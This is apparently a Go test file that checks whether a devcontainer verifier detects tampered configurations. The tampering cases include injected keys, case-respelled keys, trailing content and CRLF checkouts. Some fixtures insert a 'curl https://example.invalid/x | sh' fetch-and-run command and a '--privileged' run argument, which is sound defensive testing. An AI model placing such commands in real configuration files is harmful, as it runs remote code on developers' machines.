package devcontainer

import (
	"bytes"
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/cordanaLLM/praetor/internal/config"
)

// injectTopLevelKey places an extra member at the head of a rendered configuration.
func injectTopLevelKey(t *testing.T, data []byte, member string) []byte {
	t.Helper()
	open := bytes.IndexByte(data, '{')
	if open < 0 {
		t.Fatal("rendered configuration carries no object")
	}
	tampered := make([]byte, 0, len(data)+len(member)+4)
	tampered = append(tampered, data[:open+1]...)
	tampered = append(tampered, []byte("\n  "+member+",")...)
	return append(tampered, data[open+1:]...)
}

// respellTopLevelKey rewrites one member name without touching its value. Go's
// JSON decoder matches member names case-insensitively, so the result still
// decodes into the managed struct and re-marshals to the spec spelling; only a
// comparison against the file itself can see it.
func respellTopLevelKey(t *testing.T, data []byte, from, to string) []byte {
	t.Helper()
	quoted := []byte(`"` + from + `"`)
	if !bytes.Contains(data, quoted) {
		t.Fatalf("rendered configuration carries no %q member", from)
	}
	return bytes.Replace(data, quoted, []byte(`"`+to+`"`), 1)
}

// tamperedConfig returns the rendered configuration altered as name describes.
// Every case here survives a typed decode and re-marshals to the managed
// render, which is what the previous re-render comparison certified as in sync.
func tamperedConfig(t *testing.T, rendered []byte, name string) []byte {
	t.Helper()
	switch name {
	case "initializeCommand":
		return injectTopLevelKey(t, rendered, `"initializeCommand": "curl https://example.invalid/x | sh"`)
	case "runArgs":
		return injectTopLevelKey(t, rendered, `"runArgs": ["--privileged"]`)
	case "nullOnCreateCommand":
		return injectTopLevelKey(t, rendered, `"onCreateCommand": null`)
	case "uppercasedKey":
		return respellTopLevelKey(t, rendered, "postCreateCommand", "POSTCREATECOMMAND")
	case "capitalisedKey":
		return respellTopLevelKey(t, rendered, "remoteUser", "RemoteUser")
	case "duplicatedKey":
		return injectTopLevelKey(t, rendered, `"postCreateCommand": "curl https://example.invalid/x | sh"`)
	case "trailingBrace":
		return append(bytes.Clone(rendered), []byte("}\n")...)
	case "trailingBracket":
		return append(bytes.Clone(rendered), []byte("]\n")...)
	case "trailingObject":
		return append(bytes.Clone(rendered), []byte(`{"initializeCommand":"curl https://example.invalid/x | sh"}`)...)
	}
	t.Fatalf("no tampering named %s", name)
	return nil
}

// TestVerifySeesKeysOutsideTheManagedSchema covers the whole file, not the seven
// fields the struct happens to carry: an injected key is drift, never silence.
func TestVerifySeesKeysOutsideTheManagedSchema(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "devcontainer.json")
	dc := &DevContainer{Name: "schema-test", RemoteUser: DefaultRemoteUser, PostCreateCommand: "make verify-all"}
	if err := WriteDevContainer(t.Context(), path, dc); err != nil {
		t.Fatal(err)
	}
	rendered, err := Render(dc)
	if err != nil {
		t.Fatal(err)
	}

	// 1. Positive: the configuration Praetor wrote still verifies.
	if err := Verify(t.Context(), path, dc); err != nil {
		t.Fatalf("matching configuration rejected: %v", err)
	}

	// 2. Negative and 3. boundary: an injected key, a key whose value is null,
	// the aliased and duplicated spellings a typed decode accepts, and content
	// after the configuration object.
	for _, tc := range []struct{ name, reason string }{
		{"initializeCommand", "initializeCommand"},
		{"runArgs", "runArgs"},
		{"nullOnCreateCommand", "onCreateCommand"},
		{"uppercasedKey", "does not match expected configuration"},
		{"capitalisedKey", "does not match expected configuration"},
		{"duplicatedKey", "does not match expected configuration"},
		{"trailingBrace", "does not match expected configuration"},
		{"trailingBracket", "does not match expected configuration"},
		{"trailingObject", "carries content after its configuration object"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if err := os.WriteFile(path, tamperedConfig(t, rendered, tc.name), 0644); err != nil {
				t.Fatal(err)
			}
			err := Verify(t.Context(), path, dc)
			if err == nil {
				t.Fatal("tampered configuration reported as in sync")
			}
			if !strings.Contains(err.Error(), tc.reason) {
				t.Fatalf("error does not name its reason: %v", err)
			}
		})
	}
}

// TestLoadDevContainerSharesTheVerifierDecoder pins what actually holds between
// the reader and the verifier, and nothing beyond it. LoadDevContainer is a
// decode; it is handed no expected configuration, so it cannot compare bytes
// and cannot see an aliased, duplicated or trailing-token spelling that decodes
// into the managed struct. The invariant is therefore one-directional: every
// file decodeManagedConfig refuses is refused by both, and a file the reader
// accepts is not thereby in sync. The table below records which side of that
// line each tampering falls on, so a later change to the decoder that silently
// moves a case has to move this table with it.
func TestLoadDevContainerSharesTheVerifierDecoder(t *testing.T) {
	path := filepath.Join(t.TempDir(), "devcontainer.json")
	dc := &DevContainer{Name: "load-test", RemoteUser: DefaultRemoteUser, PostCreateCommand: "make verify-all"}
	if err := WriteDevContainer(t.Context(), path, dc); err != nil {
		t.Fatal(err)
	}
	rendered, err := Render(dc)
	if err != nil {
		t.Fatal(err)
	}

	// 1. Positive: what Praetor wrote loads back unchanged and verifies.
	loaded, err := LoadDevContainer(t.Context(), path)
	if err != nil {
		t.Fatalf("written configuration rejected: %v", err)
	}
	if loaded.Name != dc.Name || loaded.RemoteUser != dc.RemoteUser {
		t.Fatalf("loaded configuration differs: %+v", loaded)
	}
	if err := Verify(t.Context(), path, dc); err != nil {
		t.Fatalf("written configuration failed verification: %v", err)
	}

	// 2. Negative and 3. boundary: every tampering this file defines, against
	// both entry points. readerReason is empty where only the byte comparison
	// can see the edit.
	for _, tc := range []struct{ name, readerReason string }{
		{"initializeCommand", "initializeCommand"},
		{"runArgs", "runArgs"},
		{"nullOnCreateCommand", "onCreateCommand"},
		{"trailingObject", "carries content after"},
		{"uppercasedKey", ""},
		{"capitalisedKey", ""},
		{"duplicatedKey", ""},
		{"trailingBrace", ""},
		{"trailingBracket", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if err := os.WriteFile(path, tamperedConfig(t, rendered, tc.name), 0644); err != nil {
				t.Fatal(err)
			}
			if err := Verify(t.Context(), path, dc); err == nil {
				t.Fatal("verification reported a tampered file as in sync")
			}
			_, err := LoadDevContainer(t.Context(), path)
			if tc.readerReason == "" {
				if err != nil {
					t.Fatalf("the reader grew a rule the table does not record: %v", err)
				}
				return
			}
			if err == nil || !strings.Contains(err.Error(), tc.readerReason) {
				t.Fatalf("the reader did not refuse what the shared decoder refuses: %v", err)
			}
		})
	}
}

// TestDevContainerEntryPointsRejectAbsentContext enters the nil guards that the
// cancelled-context cases never reach.
func TestDevContainerEntryPointsRejectAbsentContext(t *testing.T) {
	var absent context.Context
	path := filepath.Join(t.TempDir(), "devcontainer.json")
	dc := &DevContainer{Name: "absent-context"}

	if err := WriteDevContainer(absent, path, dc); err == nil || !strings.Contains(err.Error(), "context cannot be nil") {
		t.Fatalf("WriteDevContainer accepted an absent context: %v", err)
	}
	if _, err := LoadDevContainer(absent, path); err == nil || !strings.Contains(err.Error(), "context cannot be nil") {
		t.Fatalf("LoadDevContainer accepted an absent context: %v", err)
	}
	if err := WriteBundle(absent, path, &Bundle{Config: dc}, false); err == nil || !strings.Contains(err.Error(), "requires context") {
		t.Fatalf("WriteBundle accepted an absent context: %v", err)
	}
	if _, err := os.Stat(path); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("an absent context still produced a file: %v", err)
	}
}

// TestSynthesizeFeaturesFollowsProfiles pins the profile gate on the legacy
// feature set, which has no catalog selection to fall back on.
func TestSynthesizeFeaturesFollowsProfiles(t *testing.T) {
	// 1. Positive: a repository without the native toolchain keeps the Go feature.
	plain, err := SynthesizeFromProfiles("app", []string{"framework"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := plain.Features[GoFeatureRef]; !ok {
		t.Fatal("Go feature dropped for a Go repository")
	}

	// 2. Negative: the native GPU profile rejects Go tooling, so it gets no Go feature.
	native, err := SynthesizeFromProfiles("engine", []string{"  Native-GPU-Systems  "}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := native.Features[GoFeatureRef]; ok {
		t.Fatal("Go feature injected for native-gpu-systems")
	}
	for _, name := range native.Customizations.VSCode.Extensions {
		if name == "golang.go" {
			t.Fatal("Go extension injected for native-gpu-systems")
		}
	}

	// 3. Boundary: profiles is a list, so both can be declared together; the
	// startup command must agree with the feature set the gate produced.
	assertNoGoToolchain(t, "framework then native", []string{"framework", "native-gpu-systems"})
	assertNoGoToolchain(t, "native then framework", []string{"native-gpu-systems", "framework"})

	empty, err := SynthesizeFromProfiles("app", []string{}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := empty.Features[GoFeatureRef]; !ok {
		t.Fatal("Go feature dropped for an empty profile set")
	}
}

// assertNoGoToolchain fails when a profile set that receives no Go feature is
// nonetheless told to start by running the Go toolchain.
func assertNoGoToolchain(t *testing.T, name string, profiles []string) {
	t.Helper()
	dc, err := SynthesizeFromProfiles("engine", profiles, nil)
	if err != nil {
		t.Fatalf("%s: %v", name, err)
	}
	if _, ok := dc.Features[GoFeatureRef]; ok {
		t.Fatalf("%s: Go feature injected for native-gpu-systems", name)
	}
	if strings.Contains(dc.PostCreateCommand, "go run ") {
		t.Fatalf("%s: postCreateCommand runs Go without a Go toolchain: %q", name, dc.PostCreateCommand)
	}
}

// TestSynthesizeRefusesOversizedProfileSets pins the bound PrepareBundle already
// applies: an input past MaxLoopLimit is refused, never silently truncated into
// a container that contradicts the profiles it was handed.
func TestSynthesizeRefusesOversizedProfileSets(t *testing.T) {
	const reason = "exceed bounds"

	// 1. Positive: the largest accepted profile set still synthesizes.
	atLimit := make([]string, MaxLoopLimit)
	for i := range atLimit {
		atLimit[i] = "framework"
	}
	if _, err := SynthesizeFromProfiles("app", atLimit, nil); err != nil {
		t.Fatalf("profile set at the bound rejected: %v", err)
	}

	// 2. Negative: one profile past the bound is refused rather than truncated.
	oversized := append(append([]string{}, atLimit...), "native-gpu-systems")
	if _, err := SynthesizeFromProfiles("app", oversized, nil); err == nil || !strings.Contains(err.Error(), reason) {
		t.Fatalf("oversized profile set accepted: %v", err)
	}

	// 3. Boundary: facets and the name obey the same bound, and PrepareBundle
	// refuses the identical input for the identical reason.
	oversizedFacets := make([]string, MaxLoopLimit+1)
	for i := range oversizedFacets {
		oversizedFacets[i] = "security:high"
	}
	if _, err := SynthesizeFromProfiles("app", nil, oversizedFacets); err == nil || !strings.Contains(err.Error(), reason) {
		t.Fatalf("oversized facet set accepted: %v", err)
	}
	if _, err := SynthesizeFromProfiles(strings.Repeat("n", 513), nil, nil); err == nil || !strings.Contains(err.Error(), reason) {
		t.Fatalf("oversized name accepted: %v", err)
	}
	prepared := validateBootstrapInputs(t.Context(), "app", oversized, nil)
	if prepared == nil || !strings.Contains(prepared.Error(), reason) {
		t.Fatalf("PrepareBundle and Synthesize disagree about the bound: %v", prepared)
	}
}

// TestVerifyAcceptsACRLFCheckout pins HISS-21 for the comparison this batch
// changed. Verification stopped decoding and re-rendering the file and started
// comparing its bytes, which made every CRLF line ending a mismatch: a Windows
// checkout with core.autocrlf=true failed audit on a file nobody edited. CR is
// JSON whitespace, so the comparison normalises line endings and nothing else.
func TestVerifyAcceptsACRLFCheckout(t *testing.T) {
	path := filepath.Join(t.TempDir(), "devcontainer.json")
	dc := &DevContainer{Name: "crlf-test", RemoteUser: DefaultRemoteUser, PostCreateCommand: "make verify-all"}
	rendered, err := Render(dc)
	if err != nil {
		t.Fatal(err)
	}
	asCRLF := func(data []byte) []byte { return bytes.ReplaceAll(data, []byte("\n"), []byte("\r\n")) }

	// 1. Positive: the render checked out with CRLF is in sync.
	if err := os.WriteFile(path, asCRLF(rendered), 0644); err != nil {
		t.Fatal(err)
	}
	if err := Verify(t.Context(), path, dc); err != nil {
		t.Fatalf("a CRLF checkout of the managed render was called drift: %v", err)
	}

	// 2. Negative: normalising line endings does not normalise anything else,
	// so every tampering is still refused when the file arrives with CRLF.
	for _, name := range []string{"uppercasedKey", "duplicatedKey", "trailingBrace", "runArgs"} {
		t.Run(name, func(t *testing.T) {
			if err := os.WriteFile(path, asCRLF(tamperedConfig(t, rendered, name)), 0644); err != nil {
				t.Fatal(err)
			}
			if err := Verify(t.Context(), path, dc); err == nil {
				t.Fatal("a CRLF checkout hid the tampering")
			}
		})
	}

	// 3. Boundary: a file whose endings are mixed, which is what a partial
	// checkout or a hand edit on Windows produces.
	mixed := bytes.Replace(rendered, []byte("\n"), []byte("\r\n"), 1)
	if err := os.WriteFile(path, mixed, 0644); err != nil {
		t.Fatal(err)
	}
	if err := Verify(t.Context(), path, dc); err != nil {
		t.Fatalf("a mixed-ending file was called drift: %v", err)
	}
}

// TestVerifyAcceptsACRLFRecordedBootstrap covers the second verification path
// with the same rule, so the two cannot drift apart on line endings either.
func TestVerifyAcceptsACRLFRecordedBootstrap(t *testing.T) {
	bundle, err := PrepareBundle(t.Context(), "adopted/app", []string{"framework"}, nil, BootstrapOptions{SourceRoot: bootstrapSourceFixture(t)})
	if err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(t.TempDir(), ".devcontainer", "devcontainer.json")
	if err := WriteBundle(t.Context(), target, bundle, false); err != nil {
		t.Fatal(err)
	}
	expected := mustBaseContainer(t)

	// 1. Positive: the bundle Praetor wrote verifies as written.
	if err := Verify(t.Context(), target, expected); err != nil {
		t.Fatal(err)
	}

	// 2. Negative and 3. boundary: the same file with CRLF endings verifies,
	// and one further edited byte does not.
	written, err := os.ReadFile(target)
	if err != nil {
		t.Fatal(err)
	}
	crlf := bytes.ReplaceAll(written, []byte("\n"), []byte("\r\n"))
	if err := os.WriteFile(target, crlf, 0644); err != nil {
		t.Fatal(err)
	}
	if err := Verify(t.Context(), target, expected); err != nil {
		t.Fatalf("a CRLF checkout of a recorded bootstrap was called drift: %v", err)
	}
	if err := os.WriteFile(target, bytes.Replace(crlf, []byte(`"vscode"`), []byte(`"root"`), 1), 0644); err != nil {
		t.Fatal(err)
	}
	if err := Verify(t.Context(), target, expected); err == nil {
		t.Fatal("a CRLF checkout hid an edited remoteUser")
	}
}

// TestPostCreateCommandFollowsTheSelectedFeatures pins the startup command to
// the feature set the container actually receives. The profile gate is not that
// answer: on the production path ResolveDevContainerFeatures always returns a
// non-nil selection, so the pinned catalog decides whether Go is present, and
// the native profile only decides which IDE tooling is installed.
func TestPostCreateCommandFollowsTheSelectedFeatures(t *testing.T) {
	withGo := []config.DevContainerFeature{{Ref: GoFeatureRef, Options: map[string]interface{}{}}}
	withoutGo := []config.DevContainerFeature{{Ref: CommonUtilsFeature, Options: map[string]interface{}{}}}

	for _, tc := range []struct {
		name     string
		profiles []string
		selected []config.DevContainerFeature
		wantGo   bool
	}{
		// 1. Positive: a framework repository whose catalog carries Go.
		{"framework with go in the catalog", []string{"framework"}, withGo, true},
		{"both profiles with go in the catalog", []string{"framework", "native-gpu-systems"}, withGo, true},
		// 2. Negative: the same profiles, a catalog without Go.
		{"framework without go in the catalog", []string{"framework"}, withoutGo, false},
		{"both profiles without go in the catalog", []string{"framework", "native-gpu-systems"}, withoutGo, false},
		// 3. Boundary: an empty but non-nil selection is a catalog that
		// selected nothing, and a nil selection is the legacy profile path.
		{"empty selection", []string{"framework"}, []config.DevContainerFeature{}, false},
		{"legacy framework", []string{"framework"}, nil, true},
		{"legacy both profiles", []string{"framework", "native-gpu-systems"}, nil, false},
		{"legacy native only", []string{"native-gpu-systems"}, nil, false},
		{"no profile at all", nil, nil, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			dc, err := SynthesizeFromProfilesWithFeatures("app", tc.profiles, nil, tc.selected)
			if err != nil {
				t.Fatal(err)
			}
			runsGo := strings.Contains(dc.PostCreateCommand, "go run ")
			if runsGo != tc.wantGo {
				t.Fatalf("postCreateCommand %q, want a Go startup command: %v", dc.PostCreateCommand, tc.wantGo)
			}
			// The invariant behind the table: a container is never told to
			// start by running a toolchain its feature set does not install.
			if runsGo && !containerCarriesGo(dc) {
				t.Fatalf("postCreateCommand %q runs Go, features are %v", dc.PostCreateCommand, dc.Features)
			}
		})
	}
}

// containerCarriesGo reports whether the synthesized feature map installs a Go
// toolchain, read from the rendered container rather than from the gate under
// test.
func containerCarriesGo(dc *DevContainer) bool {
	for ref := range dc.Features {
		if strings.HasSuffix((config.DevContainerFeature{Ref: ref}).Identity(), "/go") {
			return true
		}
	}
	return false
}
